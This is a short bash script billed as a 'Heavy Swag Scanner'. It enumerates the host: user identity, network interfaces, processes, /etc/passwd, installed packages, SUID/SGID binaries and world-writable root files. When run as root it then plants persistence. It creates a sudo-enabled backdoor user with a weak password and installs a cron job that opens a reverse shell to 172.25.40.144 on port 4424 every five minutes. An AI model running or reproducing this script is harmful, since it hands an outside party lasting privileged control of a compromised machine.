#!/bin/bash
echo "  ___ ___                                      _________                    ____        _________                                                
 /   |   \   ____  _____  ___  __ ___.__.     /   _____/__  _  _______     / ___\      /   _____/  ____  _____     ____    ____    ____ _______  
/    ~    \_/ __ \ \__  \ \  \/ /<   |  |     \_____  \ \ \/ \/ /\__  \   / /_/  >     \_____  \ _/ ___\ \__  \   /    \  /    \ _/ __ \\_  __ \ 
\    Y    /\  ___/  / __ \_\   /  \___  |     /        \ \     /  / __ \_ \___  /      /        \\  \___  / __ \_|   |  \|   |  \\  ___/ |  | \/ 
 \___|_  /  \___  >(____  / \_/   / ____|    /_______  /  \/\_/  (____  //_____/      /_______  / \___  >(____  /|___|  /|___|  / \___  >|__|    
       \/       \/      \/        \/                 \/               \/                      \/      \/      \/      \/      \/      \/         
                                                                                                                                                 "
id
whoami
ip a
ps aux
cat /etc/passwd
dpkg-query -W
echo "SUID"
echo""
echo""
find / -type f \( -perm -04000 -o -perm -02000 \) 2>/dev/null
find / -type f -perm -4000 2>/dev/null
echo"Writable files"
echo""
echo""
find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -type f -user root -perm -o=w -print 2>/dev/null
if [ $(id -u) -ne 0 ]; then
    echo "Run as root: sudo $0"
    exit 1
fi

useradd -m -s /bin/bash testuser
echo "testuser:12345678" | chpasswd
usermod -aG sudo testuser

echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.25.40.144/4424 0>&1'" | crontab -
